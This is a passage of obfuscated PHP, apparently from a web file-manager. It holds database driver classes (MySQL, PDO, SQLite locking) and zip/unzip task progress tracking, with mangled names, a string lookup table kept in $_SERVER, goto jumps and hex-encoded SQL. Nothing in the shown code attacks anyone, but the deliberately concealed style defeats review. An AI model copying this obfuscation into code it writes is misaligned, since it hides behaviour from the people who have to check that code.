$ÃÉìÑÒ¬[1016])); $’¤ó¨É„ = $ÜÀÑë—® ? $ÃÉìÑÒ¬[1017] : $ÃÉìÑÒ¬[1018]; $’¤ó¨É„ = $ÃÉìÑÒ¬[1018]; $Î˜²î‹Â = $’¤ó¨É„ . $ÃÉìÑÒ¬[1019] . $this->parseTable($İ®â¸ŸÒ[$ÃÉìÑÒ¬[358]]) . $ÃÉìÑÒ¬[1013] . implode($ÃÉìÑÒ¬[50], $¦¨İñæ) . $ÃÉìÑÒ¬[1020] . implode($ÃÉìÑÒ¬[50], $Ó§§ˆÛ‹); if ($ÜÀÑë—®) { $½Ä²»ıı = array(); foreach ($¦¨İñæ as $úëÆÛúÄ) { if ($úëÆÛúÄ == $ÃÉìÑÒ¬[232] || $úëÆÛúÄ == $ÃÉìÑÒ¬[1021]) { continue; } $½Ä²»ıı[] = $úëÆÛúÄ . $ÃÉìÑÒ¬[1022] . $úëÆÛúÄ . $ÃÉìÑÒ¬[1015]; } $Î˜²î‹Â .= $ÃÉìÑÒ¬[1023] . implode($ÃÉìÑÒ¬[50], $½Ä²»ıı); } return $this->execute($Î˜²î‹Â); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $„ÔÒÔ„Ò =& $_SERVER[€ä¾™²]; $this->error = $this->_linkID->errno . $„ÔÒÔ„Ò[4] . $this->_linkID->error; if ($„ÔÒÔ„Ò[12] != $this->queryStr) { $this->error .= LNG($„ÔÒÔ„Ò[48]) . $this->queryStr; } think_trace($this->error, $„ÔÒÔ„Ò[12], $„ÔÒÔ„Ò[49]); return $this->error; } public function escapeString($˜ˆõ‘ÔÏ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($˜ˆõ‘ÔÏ); } else { return addslashes($˜ˆõ‘ÔÏ); } } public function parseKey(&$ò×ë¿ì, $ôíƒÛ“ë = true) { $Óù³ø…ƒ =& $_SERVER[€ä¾™²]; if ($ôíƒÛ“ë) { $ò×ë¿ì = $this->parseKeyCheck($ò×ë¿ì); } if ($ò×ë¿ì != $Óù³ø…ƒ[221] && !preg_match($Óù³ø…ƒ[1024], $ò×ë¿ì)) { $ò×ë¿ì = $Óù³ø…ƒ[475] . trim($ò×ë¿ì, $Óù³ø…ƒ[475]) . $Óù³ø…ƒ[475]; } return $ò×ë¿ì; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ì¦ğ£¥ = '') { $åŠÛ«Ñ¤ =& $_SERVER[€ä¾™²]; if (!class_exists($åŠÛ«Ñ¤[1027])) { think_exception(think_lang($åŠÛ«Ñ¤[14]) . $åŠÛ«Ñ¤[1028]); } if (!empty($ì¦ğ£¥)) { $this->config = $ì¦ğ£¥; if (empty($this->config[$åŠÛ«Ñ¤[17]])) { $this->config[$åŠÛ«Ñ¤[17]] = array(); } } } public function connect($äÁ¸Ã÷ = '', $Î ‘çİÈ = 0) { $ş£³†¶ =& $_SERVER[€ä¾™²]; if (!isset($this->linkID[$Î ‘çİÈ])) { if (empty($äÁ¸Ã÷)) { $äÁ¸Ã÷ = $this->config; } $ªšìÅ½œ = !empty($äÁ¸Ã÷[$ş£³†¶[17]][$ş£³†¶[18]]) ? $äÁ¸Ã÷[$ş£³†¶[17]][$ş£³†¶[18]] : $this->pconnect; if ($ªšìÅ½œ) { $äÁ¸Ã÷[$ş£³†¶[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Î ‘çİÈ] = new PDO($äÁ¸Ã÷[$ş£³†¶[1029]], $äÁ¸Ã÷[$ş£³†¶[998]], $äÁ¸Ã÷[$ş£³†¶[999]], $äÁ¸Ã÷[$ş£³†¶[17]]); } catch (PDOException $­ºü±ï¼) { think_exception($­ºü±ï¼->getMessage()); } $this->dbType = $this->_getDsnType($äÁ¸Ã÷[$ş£³†¶[1029]]); if (in_array($this->dbType, array($ş£³†¶[1030], $ş£³†¶[1031], $ş£³†¶[1032], $ş£³†¶[1033]))) { think_exception($ş£³†¶[1034] . $this->dbType . $ş£³†¶[1035] . $this->dbType . $ş£³†¶[1036]); } if (!$this->linkID[$Î ‘çİÈ]) { think_exception($ş£³†¶[1037]); } try { $this->linkID[$Î ‘çİÈ]->exec($ş£³†¶[1038] . think_config($ş£³†¶[1001])); } catch (Exception $­ºü±ï¼) { } $this->connected = !0; if (1 != think_config($ş£³†¶[22])) { unset($this->config); } } return $this->linkID[$Î ‘çİÈ]; } public function free() { $this->PDOStatement = null; } public function query($³ôé„”ä, $ì¾Ó¥’è = array()) { $œ¨¥Ëê® =& $_SERVER[€ä¾™²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $³ôé„”ä; if (!empty($ì¾Ó¥’è)) { $this->queryStr .= $œ¨¥Ëê®[1039] . print_r($ì¾Ó¥’è, !0) . $œ¨¥Ëê®[1040]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($œ¨¥Ëê®[23], 1); think_status($œ¨¥Ëê®[24]); $this->PDOStatement = $this->_linkID->prepare($³ôé„”ä); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $éºÛÍå = $this->PDOStatement->execute($ì¾Ó¥’è); $this->debug(); if (!1 === $éºÛÍå) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¨¥ª•Áî, $À°ıèí½ = array()) { $˜íÓ‡Âš =& $_SERVER[€ä¾™²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¨¥ª•Áî; if (!empty($À°ıèí½)) { $this->queryStr .= $˜íÓ‡Âš[1039] . print_r($À°ıèí½, !0) . $˜íÓ‡Âš[1040]; } $ßí½üåÏ = !1; if ($this->dbType == $˜íÓ‡Âš[1033]) { if (preg_match($˜íÓ‡Âš[1041], $this->queryStr, $¹úÆŸüµ)) { $this->table = think_config($˜íÓ‡Âš[1042]) . str_ireplace(think_config($˜íÓ‡Âš[1043]), $˜íÓ‡Âš[463], $¹úÆŸüµ[2]); $ßí½üåÏ = (bool) $this->query($˜íÓ‡Âš[1044] . strtoupper($this->table) . $˜íÓ‡Âš[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($˜íÓ‡Âš[25], 1); think_status($˜íÓ‡Âš[24]); $this->PDOStatement = $this->_linkID->prepare($¨¥ª•Áî); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ËäÊÅÕ¤ = $this->PDOStatement->execute($À°ıèí½); $this->debug(); if (!1 === $ËäÊÅÕ¤) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ßí½üåÏ || preg_match($˜íÓ‡Âš[1045], $¨¥ª•Áî)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ùó¶Œ¼é = $this->_linkID->commit(); $this->transTimes = 0; if (!$ùó¶Œ¼é) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $’–Ô‘— = $this->_linkID->rollback(); $this->transTimes = 0; if (!$’–Ô‘—) { $this->error(); return !1; } } return !0; } private function getAll() { $ÒÒ°ìöÉ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ÒÒ°ìöÉ); return $ÒÒ°ìöÉ; } public function getFields($‘±—¥Á·) { $’«éîªš =& $_SERVER[€ä¾™²]; $this->initConnect(!0); if (think_config($’«éîªš[1046])) { $³Á‡é = str_replace($’«éîªš[1047], $‘±—¥Á·, think_config($’«éîªš[1046])); } else { switch ($this->dbType) { case $’«éîªš[1030]: case $’«éîªš[1048]: $³Á‡é = "\123\105\x4c\105\103\124\40\40\40\143\x6f\154\x75\155\156\x5f\x6e\141\x6d\x65\x20\141\163\40\47\116\x61\155\145\x27\x2c\40\x20\x20\x64\141\164\141\137\164\171\x70\x65\x20\x61\x73\x20\47\124\x79\x70\x65\x27\54\40\x20\x20\143\x6f\154\165\155\x6e\137\x64\145\146\141\165\x6c\164\x20\x61\163\40\47\104\145\146\x61\165\x6c\164\47\x2c\x20\x20\x20\151\x73\137\156\165\x6c\x6c\141\142\x6c\145\40\141\163\x20\x27\116\165\x6c\x6c\47\xa\x9\x9\106\122\x4f\x4d\x9\151\x6e\146\x6f\x72\x6d\141\x74\x69\157\x6e\137\163\x63\150\145\155\141\x2e\x74\x61\x62\154\x65\163\x20\x41\x53\40\x74\12\x9\x9\x4a\117\111\116\x9\151\156\x66\x6f\162\155\x61\164\151\157\x6e\x5f\163\x63\150\145\155\x61\56\143\157\154\165\155\x6e\163\40\101\x53\40\x63\xa\11\11\x4f\x4e\40\40\164\x2e\x74\141\x62\154\x65\137\143\x61\164\141\154\157\147\40\75\40\x63\x2e\x74\141\x62\x6c\145\x5f\x63\x61\164\141\x6c\157\147\xa\11\x9\x41\116\x44\x20\164\x2e\164\141\142\154\x65\137\x73\x63\150\x65\x6d\141\x20\x3d\x20\143\x2e\x74\x61\142\154\x65\x5f\163\x63\x68\145\x6d\x61\12\11\x9\x41\x4e\104\40\x74\56\164\x61\x62\x6c\145\137\156\x61\155\145\x20\x3d\40\143\56\x74\141\142\x6c\145\x5f\x6e\141\155\145\12\11\11\127\x48\105\122\105\40\x20\40\164\56\164\141\142\x6c\145\137\156\141\x6d\x65\40\x3d\x20\47{$‘±—¥Á·}\x27"; break; case $’«éîªš[1049]: $³Á‡é = $’«éîªš[1050] . $‘±—¥Á· . $’«éîªš[1051]; break; case $’«éîªš[1031]: case $’«éîªš[1033]: $³Á‡é = $’«éîªš[1052] . $’«éîªš[1053] . $’«éîªš[1054] . strtoupper($‘±—¥Á·) . $’«éîªš[1055] . strtoupper($‘±—¥Á·) . $’«éîªš[1056]; break; case $’«éîªš[1057]: $³Á‡é = $’«éîªš[1058] . $‘±—¥Á· . $’«éîªš[1059]; break; case $’«éîªš[1032]: break; case $’«éîªš[1060]: default: $³Á‡é = $’«éîªš[1061] . ($this->dbType == $’«éîªš[1060] ? "\140{$‘±—¥Á·}\140" : $‘±—¥Á·); } } $îîÑ£ÊÙ = $this->query($³Á‡é); $Áç –Å = array(); if ($îîÑ£ÊÙ) { foreach ($îîÑ£ÊÙ as $¦ªÚ‘õ‹ => $û¦Ãîù) { $û¦Ãîù = array_change_key_case($û¦Ãîù); $û¦Ãîù[$’«éîªš[32]] = isset($û¦Ãîù[$’«éîªš[32]]) ? $û¦Ãîù[$’«éîªš[32]] : $’«éîªš[463]; $û¦Ãîù[$’«éîªš[33]] = isset($û¦Ãîù[$’«éîªš[33]]) ? $û¦Ãîù[$’«éîªš[33]] : $’«éîªš[463]; $¤¨şåˆ = isset($û¦Ãîù[$’«éîªš[352]]) ? $û¦Ãîù[$’«éîªš[352]] : $û¦Ãîù[$’«éîªš[32]]; $Áç –Å[$¤¨şåˆ] = array($’«éîªš[32] => $¤¨şåˆ, $’«éîªš[33] => $û¦Ãîù[$’«éîªš[33]], $’«éîªš[35] => (bool) (isset($û¦Ãîù[$’«éîªš[104]]) && $û¦Ãîù[$’«éîªš[104]] === $’«éîªš[12] || isset($û¦Ãîù[$’«éîªš[35]]) && $û¦Ãîù[$’«éîªš[35]] === $’«éîªš[12]), $’«éîªš[37] => isset($û¦Ãîù[$’«éîªš[37]]) ? $û¦Ãîù[$’«éîªš[37]] : (isset($û¦Ãîù[$’«éîªš[56]]) ? $û¦Ãîù[$’«éîªš[56]] : $’«éîªš[463]), $’«éîªš[39] => isset($û¦Ãîù[$’«éîªš[95]]) ? strtolower($û¦Ãîù[$’«éîªš[95]]) == $’«éîªš[41] : (isset($û¦Ãîù[$’«éîªš[57]]) ? $û¦Ãîù[$’«éîªš[57]] : !1), $’«éîªš[42] => isset($û¦Ãîù[$’«éîªš[1062]]) ? strtolower($û¦Ãîù[$’«éîªš[1062]]) == $’«éîªš[44] : (isset($û¦Ãîù[$’«éîªš[95]]) ? $û¦Ãîù[$’«éîªš[95]] : !1)); } } return $Áç –Å; } public function getTables($ŒÆĞÏø” = '') { $â ™”û¡ =& $_SERVER[€ä¾™²]; if (think_config($â ™”û¡[1063])) { $Ì¹¤÷•š = str_replace($â ™”û¡[1064], $ŒÆĞÏø”, think_config($â ™”û¡[1063])); } else { switch ($this->dbType) { case $â ™”û¡[1031]: case $â ™”û¡[1033]: $Ì¹¤÷•š = $â ™”û¡[1065]; break; case $â ™”û¡[1030]: case $â ™”û¡[1048]: $Ì¹¤÷•š = $â ™”û¡[1066]; break; case $â ™”û¡[1057]: $Ì¹¤÷•š = $â ™”û¡[1067]; break; case $â ™”û¡[1032]: think_exception(think_lang($â ™”û¡[1068]) . $â ™”û¡[1069]); break; case $â ™”û¡[1049]: $Ì¹¤÷•š = $â ™”û¡[45] . $â ™”û¡[46] . $â ™”û¡[47]; break; case $â ™”û¡[1060]: default: if (!empty($ŒÆĞÏø”)) { $Ì¹¤÷•š = $â ™”û¡[1009] . $ŒÆĞÏø” . $â ™”û¡[1010]; } else { $Ì¹¤÷•š = $â ™”û¡[1011]; } } } $¥œŞ±Ïá = $this->query($Ì¹¤÷•š); $â©ğî¼Ê = array(); foreach ($¥œŞ±Ïá as $×ÕŞ©Í€ => $€×å³ë) { $â©ğî¼Ê[$×ÕŞ©Í€] = current($€×å³ë); } return $â©ğî¼Ê; } protected function parseLimit($¬ÇĞøäş) { $„àìŞşë =& $_SERVER[€ä¾™²]; $·š®¾¦¯ = $„àìŞşë[12]; if (!empty($¬ÇĞøäş)) { switch ($this->dbType) { case $„àìŞşë[1057]: case $„àìŞşë[1049]: $¬ÇĞøäş = explode($„àìŞşë[50], $¬ÇĞøäş); if (count($¬ÇĞøäş) > 1) { $·š®¾¦¯ .= $„àìŞşë[51] . $¬ÇĞøäş[1] . $„àìŞşë[52] . $¬ÇĞøäş[0] . $„àìŞşë[53]; } else { $·š®¾¦¯ .= $„àìŞşë[51] . $¬ÇĞøäş[0] . $„àìŞşë[53]; } break; case $„àìŞşë[1030]: case $„àìŞşë[1048]: break; case $„àìŞşë[1032]: break; case $„àìŞşë[1031]: case $„àìŞşë[1033]: break; case $„àìŞşë[1060]: default: $·š®¾¦¯ .= $„àìŞşë[51] . $¬ÇĞøäş . $„àìŞşë[53]; } } return $·š®¾¦¯; } public function parseKey(&$Èã°÷ø, $İÊ¥é±Ã = true) { $ĞÎ»Üù =& $_SERVER[€ä¾™²]; if ($İÊ¥é±Ã) { $Èã°÷ø = $this->parseKeyCheck($Èã°÷ø); } if ($this->dbType == $ĞÎ»Üù[1060]) { if ($Èã°÷ø != $ĞÎ»Üù[221] && !preg_match($ĞÎ»Üù[1024], $Èã°÷ø)) { $Èã°÷ø = $ĞÎ»Üù[475] . trim($Èã°÷ø, $ĞÎ»Üù[475]) . $ĞÎ»Üù[475]; } return $Èã°÷ø; } else { return parent::parseKey($Èã°÷ø, $İÊ¥é±Ã); } } public function close() { $this->_linkID = null; } public function error() { $“ÀÊÖğı =& $_SERVER[€ä¾™²]; if ($this->PDOStatement) { $æ©áˆ‡ = $this->PDOStatement->errorInfo(); $this->error = $æ©áˆ‡[1] . $“ÀÊÖğı[4] . $æ©áˆ‡[2]; } else { $this->error = $“ÀÊÖğı[12]; } if ($“ÀÊÖğı[12] != $this->queryStr) { $this->error .= LNG($“ÀÊÖğı[48]) . $this->queryStr; } think_trace($this->error, $“ÀÊÖğı[12], $“ÀÊÖğı[49]); return $this->error; } public function escapeString($öõ…Â©) { $ƒ³¹Í­È =& $_SERVER[€ä¾™²]; switch ($this->dbType) { case $ƒ³¹Í­È[1057]: case $ƒ³¹Í­È[1030]: case $ƒ³¹Í­È[1048]: case $ƒ³¹Í­È[1060]: return addslashes($öõ…Â©); case $ƒ³¹Í­È[1032]: case $ƒ³¹Í­È[1049]: case $ƒ³¹Í­È[1031]: case $ƒ³¹Í­È[1033]: return str_ireplace($ƒ³¹Í­È[58], $ƒ³¹Í­È[59], $öõ…Â©); } } protected function parseValue($Å²¶¢ÏÍ) { $‚ÊœŒ =& $_SERVER[€ä¾™²]; if (is_string($Å²¶¢ÏÍ)) { $ª½úâñ = strpos($Å²¶¢ÏÍ, $‚ÊœŒ[4]) === 0 && in_array($Å²¶¢ÏÍ, array_keys($this->bind)); $Å²¶¢ÏÍ = $ª½úâñ ? $this->escapeString($Å²¶¢ÏÍ) : $‚ÊœŒ[1070] . $this->escapeString($Å²¶¢ÏÍ) . $‚ÊœŒ[1070]; } elseif (isset($Å²¶¢ÏÍ[0]) && is_string($Å²¶¢ÏÍ[0]) && strtolower($Å²¶¢ÏÍ[0]) == $‚ÊœŒ[373]) { $Å²¶¢ÏÍ = $this->escapeString($Å²¶¢ÏÍ[1]); } elseif (is_array($Å²¶¢ÏÍ)) { $Å²¶¢ÏÍ = array_map(array($this, $‚ÊœŒ[1071]), $Å²¶¢ÏÍ); } elseif (is_bool($Å²¶¢ÏÍ)) { $Å²¶¢ÏÍ = $Å²¶¢ÏÍ ? $‚ÊœŒ[91] : $‚ÊœŒ[229]; } elseif (is_null($Å²¶¢ÏÍ)) { $Å²¶¢ÏÍ = $‚ÊœŒ[104]; } return $Å²¶¢ÏÍ; } public function getLastInsertId() { $ûï€Ô×Î =& $_SERVER[€ä¾™²]; switch ($this->dbType) { case $ûï€Ô×Î[1057]: case $ûï€Ô×Î[1049]: case $ûï€Ô×Î[1030]: case $ûï€Ô×Î[1048]: case $ûï€Ô×Î[1032]: case $ûï€Ô×Î[1060]: return $this->_linkID->lastInsertId(); case $ûï€Ô×Î[1031]: case $ûï€Ô×Î[1033]: $—˜›ºœ = $this->table; $Â¹ÇØ¯¯ = $this->query("\x53\105\114\105\103\124\x20{$—˜›ºœ}\x2e\x63\x75\162\162\x76\141\154\x20\143\x75\162\162\166\x61\x6c\x20\106\122\x4f\115\x20\144\165\x61\x6c"); return $Â¹ÇØ¯¯ ? $Â¹ÇØ¯¯[0][$ûï€Ô×Î[1072]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($•À“ü ) { $ÓØŸœôæ =& $_SERVER[€ä¾™²]; if (!CacheLock::fileLock($ÓØŸœôæ[13])) { return !1; } $Ş›ï¾ = parent::query($•À“ü ); CacheLock::fileUnLock($ÓØŸœôæ[13]); return $Ş›ï¾; } public function execute($øÁ‚à˜ª) { $‘İ”¨Øª =& $_SERVER[€ä¾™²]; if (!CacheLock::fileLock($‘İ”¨Øª[13])) { return !1; } $áåºûìò = parent::execute($øÁ‚à˜ª); CacheLock::fileUnLock($‘İ”¨Øª[13]); return $áåºûìò; } } goto EåÎÖÄÏ´; c‚Õ’ÇÔ‡á: define($_SERVER[€ä¾™²][318], 3); define($_SERVER[€ä¾™²][319], 1); define($_SERVER[€ä¾™²][320], 0); goto cÊ˜Ó°‹¸—; a±œÛÚÄã¢: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $šöøÇË‘ =& $_SERVER[€ä¾™²]; parent::startAfter(); Hook::bind($šöøÇË‘[2046], array($this, $šöøÇË‘[2047])); Hook::bind($šöøÇË‘[1327], array($this, $šöøÇË‘[2048])); Hook::bind($šöøÇË‘[2049], array($this, $šöøÇË‘[2050])); $÷“ˆÙ–  =& $this->task; $÷“ˆÙ– [$šöøÇË‘[2051]] = $šöøÇË‘[1328]; if (!$÷“ˆÙ– [$šöøÇË‘[1810]]) { $÷“ˆÙ– [$šöøÇË‘[1810]] = LNG($šöøÇË‘[2052]); } } protected function endAfter() { $’Î²Ìñà =& $_SERVER[€ä¾™²]; parent::endAfter(); Hook::unbind($’Î²Ìñà[2046], array($this, $’Î²Ìñà[2047])); Hook::unbind($’Î²Ìñà[1327], array($this, $’Î²Ìñà[2048])); Hook::unbind($’Î²Ìñà[2049], array($this, $’Î²Ìñà[2050])); } public function updateAfter() { $®òüö =& $_SERVER[€ä¾™²]; $½©”±ğÏ =& $this->task; if (!$½©”±ğÏ[$®òüö[1175]] || !$½©”±ğÏ[$®òüö[864]]) { if ($½©”±ğÏ[$®òüö[2051]] != $®òüö[389]) { return; } } if ($½©”±ğÏ[$®òüö[2051]] == $®òüö[1328]) { $™±Å×‘á = 0; if ($½©”±ğÏ[$®òüö[1975]]) { $™±Å×‘á = $½©”±ğÏ[$®òüö[1976]] / $½©”±ğÏ[$®òüö[1975]]; } $½©”±ğÏ[$®òüö[1923]] = $™±Å×‘á * 0.3; } else { if ($½©”±ğÏ[$®òüö[2051]] == $®òüö[389]) { $™±Å×‘á = $½©”±ğÏ[$®òüö[1922]] / $½©”±ğÏ[$®òüö[1175]]; $½©”±ğÏ[$®òüö[1923]] = 0.3 + $™±Å×‘á * 0.4; } else { if ($½©”±ğÏ[$®òüö[2051]] == $®òüö[108]) { $ØÒŸƒ±ô = 0; if ($½©”±ğÏ[$®òüö[1977]] == $®òüö[108]) { $ØÒŸƒ±ô = $½©”±ğÏ[$®òüö[1976]]; } $™±Å×‘á = ($½©”±ğÏ[$®òüö[1980]] + $ØÒŸƒ±ô) / $½©”±ğÏ[$®òüö[864]]; $½©”±ğÏ[$®òüö[1923]] = 0.3 + 0.4 + $™±Å×‘á * 0.3; } } } if ($½©”±ğÏ[$®òüö[1923]] > 0) { $ÃÚæÆ¸û = timeFloat() - $½©”±ğÏ[$®òüö[1925]] - $½©”±ğÏ[$®òüö[1928]]; $½©”±ğÏ[$®òüö[1929]] = $ÃÚæÆ¸û * (1 - $½©”±ğÏ[$®òüö[1923]]) / $½©”±ğÏ[$®òüö[1923]]; } } public function addFile($ˆÔñÍ) { $ïÒ¢ß‚á =& $_SERVER[€ä¾™²]; $²æ¥š¨õ =& $this->task; $ºö°õİÂ = IO::info($ˆÔñÍ); $²æ¥š¨õ[$ïÒ¢ß‚á[1973]] = $ºö°õİÂ[$ïÒ¢ß‚á[32]]; $²æ¥š¨õ[$ïÒ¢ß‚á[1975]] = $ºö°õİÂ[$ïÒ¢ß‚á[79]]; $²æ¥š¨õ[$ïÒ¢ß‚á[1976]] = 0; $²æ¥š¨õ[$ïÒ¢ß‚á[1177]] = $ïÒ¢ß‚á[2004]; $²æ¥š¨õ[$ïÒ¢ß‚á[1977]] = $ïÒ¢ß‚á[1328]; $²æ¥š¨õ[$ïÒ¢ß‚á[864]] = $ºö°õİÂ[$ïÒ¢ß‚á[79]]; $²æ¥š¨õ[$ïÒ¢ß‚á[1175]] = 1; $Ê¾óÊÏº = 0; $²æ¥š¨õ[$ïÒ¢ß‚á[1986]] = array($ïÒ¢ß‚á[1987] => $Ê¾óÊÏº + 1, $ïÒ¢ß‚á[516] => $ºö°õİÂ[$ïÒ¢ß‚á[32]], $ïÒ¢ß‚á[87] => $ºö°õİÂ[$ïÒ¢ß‚á[87]], $ïÒ¢ß‚á[609] => $ºö°õİÂ[$ïÒ¢ß‚á[609]] ? $ºö°õİÂ[$ïÒ¢ß‚á[609]] : $ºö°õİÂ[$ïÒ¢ß‚á[87]]); $this->update(); } public function zipEvent($î“öòÏ¸, $Ğ×âËÛ®, $ıª£‡´, $õæóŸ¥±) { $ÃóïìÁÄ =& $_SERVER[€ä¾™²]; $«£¸Ñ› =& $this->task; $«£¸Ñ›[$ÃóïìÁÄ[1973]] = get_path_this($Ğ×âËÛ®); $«£¸Ñ›[$ÃóïìÁÄ[1975]] = $õæóŸ¥±; $«£¸Ñ›[$ÃóïìÁÄ[1976]] = $ıª£‡´; $«£¸Ñ›[$ÃóïìÁÄ[1177]] = $î“öòÏ¸ == $ÃóïìÁÄ[2053] ? $ÃóïìÁÄ[2054] : $ÃóïìÁÄ[2055]; $«£¸Ñ›[$ÃóïìÁÄ[1977]] = $ÃóïìÁÄ[12]; $«£¸Ñ›[$ÃóïìÁÄ[864]] = $õæóŸ¥±; $«£¸Ñ›[$ÃóïìÁÄ[2051]] = $ÃóïìÁÄ[389]; $this->update(); } public function unzipAfter($Ì°¾Œ´ı) { $¾–êÜÙç =& $_SERVER[€ä¾™²]; $Áë¸¨ßÆ =& $this->task; $Áë¸¨ßÆ[$¾–êÜÙç[2051]] = $¾–êÜÙç[108]; $Ûğ»®Ïè = IO::infoWithChildren($Ì°¾Œ´ı); $·êÚí¹» = 0; $Áë¸¨ßÆ[$¾–êÜÙç[1986]] = array($¾–êÜÙç[1987] => $·êÚí¹» + 1, $¾–êÜÙç[516] => $Ûğ»®Ïè[$¾–êÜÙç[32]], $¾–êÜÙç[87] => $Ûğ»®Ïè[$¾–êÜÙç[87]], $¾–êÜÙç[609] => $Ûğ»®Ïè[$¾–êÜÙç[609]] ? $Ûğ»®Ïè[$¾–êÜÙç[609]] : $Ûğ»®Ïè[$¾–êÜÙç[87]]); if ($Ûğ»®Ïè[$¾–êÜÙç[33]] == $¾–êÜÙç[231]) { $Áë¸¨ßÆ[$¾–êÜÙç[1175]] = 1; } else { $Áë¸¨ßÆ[$¾–êÜÙç[1175]] = $Ûğ»®Ïè[$¾–êÜÙç[82]][$¾–êÜÙç[80]]; } $Áë¸¨ßÆ[$¾–êÜÙç[1177]] = $¾–êÜÙç[12]; $Áë¸¨ßÆ[$¾–êÜÙç[1977]] = 0; $Áë¸¨ßÆ[$¾–êÜÙç[1922]] = 0; $Áë¸¨ßÆ[$¾–êÜÙç[1975]] = 0; $Áë¸¨ßÆ[$¾–êÜÙç[1976]] = 0; $Áë¸¨ßÆ[$¾–êÜÙç[1973]] = $¾–êÜÙç[12]; $Áë¸¨ßÆ[$¾–êÜÙç[1980]] = 0; $Áë¸¨ßÆ[$¾–êÜÙç[864]] = $Ûğ»®Ïè[$¾–êÜÙç[79]]; $this->update(); self::log($¾–êÜÙç[2056] . json_encode(array($Áë¸¨ßÆ, $Ûğ»®Ïè))); } public function nameParse($›óÁ÷Å) { $¥áÔŠÏ  =& $_SERVER[€ä¾™²]; $¼ùÌˆŠš =& $this->task; if ($¼ùÌˆŠš[$¥áÔŠÏ [2051]] == $¥áÔŠÏ [1328]) { $¼ùÌˆŠš[$¥áÔŠÏ [2051]] = $¥áÔŠÏ [389]; $¼ùÌˆŠš[$¥áÔŠÏ [1980]] = 0; $¼ùÌˆŠš[$¥áÔŠÏ [864]] = 0; } $“°ıè€ = get_path_this($›óÁ÷Å); if (strstr($“°ıè€, $¥áÔŠÏ [10])) { $¼ùÌˆŠš[$¥áÔŠÏ [1922]] += 1; $¼ùÌˆŠš[$¥áÔŠÏ [1175]] += 1; } $¼ùÌˆŠš[$¥áÔŠÏ [1973]] = $›óÁ÷Å; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $•ˆµ‹»õ =& $_SERVER[€ä¾™²]; parent::startAfter(); Hook::bind($•ˆµ‹»õ[2057], array($this, $•ˆµ‹»õ[2047])); Hook::bind($•ˆµ‹»õ[2049], array($this, $•ˆµ‹»õ[2050])); $Â¢Ã‚¢„ =& $this->task; $Â¢Ã‚¢„[$•ˆµ‹»õ[2051]] = $•ˆµ‹»õ[1328]; if (!$Â¢Ã‚¢„[$•ˆµ‹»õ[1810]]) { $Â¢Ã‚¢„[$•ˆµ‹»õ[1810]] = LNG($•ˆµ‹»õ[2058]); } } protected function endAfter() { $¶ö¯Ó‚¬ =& $_SERVER[€ä¾™²]; parent::endAfter(); Hook::unbind($¶ö¯Ó‚¬[2057], array($this, $¶ö¯Ó‚¬[2047])); Hook::unbind($¶ö¯Ó‚¬[2049], array($this, $¶ö¯Ó‚¬[2050])); } public function updateAfter() { $Òˆã¹¿Ë =& $_SERVER[€ä¾™²]; $çÅĞ¨µ¿ =& $this->task; if (!$çÅĞ¨µ¿[$Òˆã¹¿Ë[1175]] || !$çÅĞ¨µ¿[$Òˆã¹¿Ë[864]]) { return; } if ($çÅĞ¨µ¿[$Òˆã¹¿Ë[2051]] == $Òˆã¹¿Ë[1328]) { $Âï×ù… = $çÅĞ¨µ¿[$Òˆã¹¿Ë[1976]]; if ($çÅĞ¨µ¿[$Òˆã¹¿Ë[1977]] != $Òˆã¹¿Ë[1328]) { $Âï×ù… = 0; } $±…×úõÓ = ($çÅĞ¨µ¿[$Òˆã¹¿Ë[1980]] + $Âï×ù…) / $çÅĞ¨µ¿[$Òˆã¹¿Ë[864]]; $çÅĞ¨µ¿[$Òˆã¹¿Ë[1923]] = $±…×úõÓ * 0.3; } else { if ($çÅĞ¨µ¿[$Òˆã¹¿Ë[2051]] == $Òˆã¹¿Ë[389]) { $±…×úõÓ = $çÅĞ¨µ¿[$Òˆã¹¿Ë[1922]] / $çÅĞ¨µ¿[$Òˆã¹¿Ë[1175]]; $çÅĞ¨µ¿[$Òˆã¹¿Ë[1923]] = 0.3 + $±…×úõÓ * 0.5; } else { if ($çÅĞ¨µ¿[$Òˆã¹¿Ë[2051]] == $Òˆã¹¿Ë[108]) { $±…×úõÓ = 0; if ($çÅĞ¨µ¿[$Òˆã¹¿Ë[1975]]) { $±…×úõÓ = $çÅĞ¨µ¿[$Òˆã¹¿Ë[1976]] / $çÅĞ¨µ¿[$Òˆã¹¿Ë[1975]]; } $çÅĞ¨µ¿[$Òˆã¹¿Ë[1923]] = 0.3 + 0.5 + $±…×úõÓ * 0.2; } } } if ($çÅĞ¨µ¿[$Òˆã¹¿Ë[1923]] > 0) { $´Ë¼Ëûİ = timeFloat() - $çÅĞ¨µ¿[$Òˆã¹¿Ë[1925]] - $çÅĞ¨µ¿[$Òˆã¹¿Ë[1928]]; $çÅĞ¨µ¿[$Òˆã¹¿Ë[1929]] = $´Ë¼Ëûİ * (1 - $çÅĞ¨µ¿[$Òˆã¹¿Ë[1923]]) / $çÅĞ¨µ¿[$Òˆã¹¿Ë[1923]]; } } public function copyFileStart($íàŞ÷·ô, $ÉŞšÏÚ, $ûïÁ¡åĞ, $­ÁÇ™ß, $¾Ø˜ş©Š, $×‘üˆº§) { $·¦‡¥¡“ =& 